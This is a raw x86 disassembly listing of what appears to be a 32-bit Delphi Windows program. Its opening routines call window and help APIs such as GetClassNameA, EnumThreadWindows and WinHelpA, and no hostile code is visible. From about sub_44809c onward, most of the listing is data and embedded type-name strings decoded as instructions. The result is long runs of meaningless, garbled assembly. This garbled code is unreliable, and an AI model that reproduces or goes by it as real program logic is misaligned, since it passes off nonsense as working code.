je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_447cf4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4086b4
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_447d4f
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408690
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_447dc4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40439c
xor eax eax
push ebp
push sub_447e3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_447da8
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447e41
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407d10
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_447e50
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_447e6c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_447da8
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_447e4c
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_447e50
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_447ec8
sub_447ec8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_447f45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_447928
call GetTickCount
mov ebx eax
push 0x0
call sub_4062c0
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_447528
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447f4c
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_447f54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4034c0
call sub_405770
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_447f9c
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_447fc8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_448036
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44803d
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405758
mov eax rw-data
call sub_405758
mov eax rw-data
call sub_405758
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_405758
mov eax [ rw-data ]
call sub_4475f8
sub_448040
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_448092
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448099
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_447f54
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405758
mov edx eax
mov eax [ rw-data ]
call sub_42a7e8
sub_44809c
mov al [ 0x1004480 ]
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
shr [ ebx + 0x540b0044 ] 0x44
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc esp
add [ eax ] dl
lodsb [ esi ]
inc esp
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
lodsb [ esi ]
lodsb [ esi ]
inc esp
add [ ebx + ebp * 4 - 0x5467ffbc ] bl
inc esp
add [ edx + ebp * 4 - 0x53abffbc ] bl
inc esp
add [ eax - 0x56 ] ah
inc esp
add [ ebx + ebp * 4 - 0x5447ffbc ] dh
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 4 - 0x7f ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 2 - 0x7f ] si
inc esp
add [ ecx + edx ] ch
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
mov esp 0x1004480
pop es
push esp
inc ebx
jne r-xdata
jb r-xdata
inc eax
add [ eax - 0x7f ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
or al 0x31
inc eax
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
add [ eax + eax + 0x34 ] 0xd8000000
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
and [ esp + eax * 2 + 0x44ac1000 ] ch
jae r-xdata
add [ ebx + eax * 4 ] cl
inc esp
jb r-xdata
add al al
stosd [ edi ]
inc esp
add [ eax + 0x300044ac ] al
lodsb [ esi ]
inc esp
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 4 + 0x340044 ] bl
add [ eax ] al
fcom [ eax ]
inc eax
add [ ebx + esi - 0x53dfffc0 ] ah
inc esp
add [ eax ] dl
lodsb [ esi ]
inc esp
jb r-xdata
inc esp
add al bh
lodsb [ esi ]
inc esp
add [ edx + ebp * 4 - 0x53abffbc ] bl
inc esp
add [ eax - 0x56 ] ah
inc esp
add [ ebp * 4 - 0x5447ffbc ] al
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
rol [ ecx + 0x33a40044 ] 0x1
inc eax
add [ eax ] ah
lodsb [ esi ]
inc esp
add [ eax ] dl
add [ eax ] al
or al 0x83
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x44821cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7e ] cl
inc esp
add [ eax + eax ] bh
add [ eax ] al
sub al 0x81
inc esp
add [ ebx + esi - 0x53dfffc0 ] ah
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
aam 0x80
inc esp
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add al dl
add [ eax + eax + 0x6 ] 0x61
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc esp
add [ edi + ebp * 4 ] ah
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ ebp * 4 - 0x537fffbc ] ah
inc esp
add [ eax ] dh
lodsb [ esi ]
inc esp
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
stosd [ edi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x6c ] si
add [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
add [ eax + eax + 0x40 ] 0x0
add [ eax ] al
xchg esp eax
add [ eax + eax - 0x5c ] 0x33
inc eax
add [ eax ] ah
lodsb [ esi ]
inc esp
add [ ebp + ebp * 4 + 0x44 ] al
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
lodsb [ esi ]
lodsb [ esi ]
inc esp
add al ah
lodsb [ esi ]
lodsb [ esi ]
inc esp
add [ eax - 0x53ffbfcd ] bh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x64 ] si
add [ eax + eax + 0x7 ] 0x16
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc esp
add [ ebx + esi - 0x53dfffc0 ] ah
inc esp
add [ eax ] bh
scasd [ edi ]
inc esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 - 0x7c ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 8 - 0x7d ] si
inc esp
add [ eax - 0x7e ] ah
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
stosd [ edi ]
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ eax - 0x53 ] cl
inc esp
add [ eax - 0x3ffbb52 ] al
scasb [ edi ]
inc esp
add [ eax ] dl
scasd [ edi ]
inc esp
add [ eax ] dh
scasd [ edi ]
inc esp
add [ edi ] cl
push esp
inc esp
jb r-xdata
stosd [ edi ]
inc esp
add [ eax - 0x3fffbb55 ] bh
inc esp
add [ eax - 0x63ffbb55 ] bl
stosb [ edi ]
inc esp
add ah bl
lodsd [ esi ]
inc esp
add [ eax - 0x56 ] ah
inc esp
add [ ebx + ebp * 4 - 0x5447ffbc ] dh
inc esp
add al al
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
cld
add [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esp + eax * 2 + 0x7000 ] al
add al dl
add [ eax + eax - 0x5c ] 0x20004033
lodsb [ esi ]
inc esp
add [ eax ] dl
lodsb [ esi ]
inc esp
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
lodsb [ esi ]
lodsd [ esi ]
inc esp
add [ esp + ebp * 4 - 0x50dbffbc ] ch
xor eax [ eax ]
or al 0x31
lodsb [ esi ]
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor [ eax ] eax
xor [ fs : eax ] eax
pop eax
stosb [ edi ]
inc esp
add [ ebx + ebp * 4 - 0x5467ffbc ] bl
inc esp
add [ edx + ebp * 4 - 0x55ffffbc ] bl
inc esp
add [ eax - 0x56 ] ah
outsd
insd
inc ecx
add [ eax - 0x75 ] dh
inc ecx
add ah cl
dec ebx
inc edx
add [ eax + 0x3400424b ] bh
rol [ eax + eax + 0xe ] 0x54
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
pop esp
test [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4485 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 4 + 0x44 ] dh
add al al
stosd [ edi ]
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ eax - 0x53 ] cl
inc esp
add [ eax - 0x3ffbb52 ] al
scasb [ edi ]
inc esp
add [ eax ] dl
scasd [ edi ]
inc esp
add [ eax ] dh
scasd [ edi ]
inc esp
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
lodsb [ esi ]
lodsb [ esi ]
inc esp
add al ah
lodsb [ esi ]
add [ ebx + esi + 0x310c0040 ] ch
inc ebx
outsd
outsb
je r-xdata
stosd [ edi ]
inc esp
add [ ebx ] cl
push esp
inc esp
mov ah 0xab
inc esp
add [ eax - 0x3fffbb55 ] bh
je r-xdata
xor eax [ eax ]
or al 0x31
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
or al 0x31
inc eax
add [ ebx + 0x4484c0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
test [ eax + eax + 0x70 ] al
add [ eax ] al
add [ eax - 0x5bffbb7d ] dh
xor eax [ eax ]
and [ esp + eax * 2 + 0x44af3800 ] ch
inc esp
add al bh
lodsb [ esi ]
inc esp
add [ edx + ebp * 4 - 0x53abffbc ] bl
inc esp
add [ eax - 0x56 ] ah
inc esp
add [ ebp * 4 - 0x5447ffbc ] al
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx - 0x7e ] si
inc esp
add [ eax + 0x4481 ] ch
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ ebx + ebp * 4 - 0x5447ffbc ] dh
inc esp
add al al
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x44869090
add [ ebx ] al
or al 0x54
inc eax
add [ eax ] ch
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
jae r-xdata
inc esp
add [ ebp * 4 - 0x537fffbc ] ah
inc esp
add [ eax ] dh
lodsb [ esi ]
inc esp
add [ edx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ edi + eax * 4 + 0x44 ] dl
add [ esi ] al
outsd
insd
popad
je r-xdata
inc esp
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebp + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
mov [ ebp + 0xe070044 ] al
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp - 0x7d1fffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
add [ eax ] ch
xor [ eax ] eax
lodsb [ esi ]
lodsd [ esi ]
inc esp
add [ esp + ebp * 4 - 0x50dbffbc ] ch
inc esp
add [ eax - 0x63ffbb55 ] bl
stosb [ edi ]
inc esp
add ah bl
lodsd [ esi ]
inc esp
add [ eax - 0x56 ] ah
inc esp
add [ ebx + ebp * 4 - 0x5447ffbc ] dh
inc esp
add [ eax + eax ] ah
add [ edi + 0x42 ] ch
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
or cl al
inc esp
add [ esp + ecx * 4 + 0x41 ] dl
add [ esp + ecx * 4 + 0x41 ] bl
inc esp
inc edx
add [ eax - 0x73ffbb3b ] bl
adc al [ edx ]
inc esp
mov [ eax + eax - 0x24 ] 0x11
inc edx
add [ eax + 0x12 ] dh
inc edx
add ah al
adc al [ edx ]
test ah al
inc esp
add [ eax - 0x64 ] cl
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
mov eax 0xac004033
xor eax [ eax ]
or al 0x31
outsd
insb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] cl
xchg [ eax + eax + 0xb ] eax
jae r-xdata
mov [ edi + 0x9010044 ] es
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + eax * 4 + 0x6d060044 ] cl
bound ecx [ ebp + 0x66 ]
je r-xdata
and al 0x12
inc edx
add [ eax - 0x3d ] bh
inc esp
add [ eax + 0x12 ] bl
jae r-xdata
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
inc eax
add [ eax ] cl
mov [ eax + eax + 0x6 ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
xchg [ eax + eax + 0x6 ] eax
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
ror [ edi + eax * 4 ] 0x44
xchg [ eax + eax + 0x6 ] eax
popad
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
xor [ eax ] eax
test [ eax + eax - 0x28 ] eax
daa
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
retn 0x44
add [ edi + eax * 4 + 0x1c900044 ] edi
mov [ eax + eax + 0x1 ] al
andps xmm0 [ ebx + 0x6f ]
push esp
add [ ecx ] ecx
inc ebp
outsb
je r-xdata
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
jbe r-xdata
outsd
insb
jae r-xdata
inc ebp
add al bh
les eax [ eax + eax + 0x70 ]
pushfd
inc ebp
add [ esp + ebx * 4 - 0x398fffbb ] al
inc esp
add [ eax * 8 - 0x633fffbc ] ch
inc ebp
add ah dl
pushfd
inc ebp
add [ ebp + eax * 8 + 0x44 ] ah
add ah bh
pushfd
inc ebp
add al al
lds eax [ eax + eax + 0x4 ]
popfd
inc ebp
add al ah
lds eax [ eax + eax + 0xc ]
popfd
inc ebp
add ah dh
mov [ eax + eax - 0x2c ] 0xc6
inc esp
add [ edi + eax * 8 ] dl
inc esp
add [ eax ] al
mov [ eax + eax + 0x20 ] 0x9d
inc ebp
add [ ebx * 4 - 0x39dbffbb ] ah
inc esp
add [ ebx + eax * 8 + 0x54120044 ] dl
inc ebx
outsd
outsb
je r-xdata
inc edx
add [ esp + eax * 8 - 0x63b7ffbc ] al
outsd
insb
jae r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
mov eax [ ecx ]
nop
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
xchg [ eax + eax + 0x3 ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebp - 0x7a03ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7a ] bh
inc esp
add [ eax + eax ] bl
add [ eax ] al
pushad
xchg ebp eax
inc ebp
add [ ebx + esi + 0x33b00040 ] ah
inc eax
fadd st2
inc esp
inc ebx
outsd
outsb
jae r-xdata
add [ esp + ecx * 4 + 0x41 ] bl
add [ eax - 0x75 ] dh
inc ecx
add [ ebx + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 + 0x44 ] dl
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
jae r-xdata
outsb
jae r-xdata
inc ebx
outsd
imul ebp [ edi + 0x6e ] 0x87b4c08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
pop eax
xchg [ eax + eax + 0x3 ] eax
insb
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
popad
js r-xdata
jb r-xdata
dec ebp
popad
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
inc esp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add [ edi + eax * 4 + 0x61060044 ] bh
inc esp
add [ eax + 0x74614454 ] al
add eax eax
xchg [ eax + eax + 0x3 ] eax
or edx [ ecx + eax * 2 + 0x6e ]
outsb
mov eax eax
mov ah 0x87
or [ ebx + 0x6f ] al
outsb
je r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
insb
mov [ eax + eax + 0x8 ] eax
or edx [ ebp + ecx * 2 + 0x6f ]
mov [ eax + eax + 0x14 ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
mov al 0x88
inc esp
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
dec esp
popad
arpl [ eax + 0x6f ] bp
jb r-xdata
add ecx [ ebx ]
push esp
inc ecx
outsb
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
add bh bh
fadd st2
inc esp
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
sbb [ eax + 0x100044 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x44881874
jb r-xdata
add [ ecx ] al
add [ eax ] al
add ah cl
xchg [ eax + eax + 0x8 ] al
insd
dec ebp
popad
outsb
jne r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax - 0x79 ] bl
inc esp
add [ ebx ] al
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
mov [ eax + eax + 0x10 ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x44888473
add [ eax + 0x400415c ] bl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ ecx + edx ] ch
inc eax
add [ eax + 0xc004010 ] al
push ebp
inc ecx
add [ eax + r-xdata ] dl
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax + eax ] dl
add bh bh
fadd st2
inc esp
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
inc esp
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ ecx + edx ] ch
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax ] bl
mov [ eax + eax + 0x8 ] al
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] cl
xchg [ eax + eax ] eax
adc [ eax ] al
nop
pop eax
mov eax [ eax + eax + 0x8 ]
push cs
sub al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
push esp
dec ebx
jns r-xdata
adc [ eax ] 0x40
add [ edx * 2 - 0x6b6fffbf ] cl
mov al [ eax + eax + 0x8 ]
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
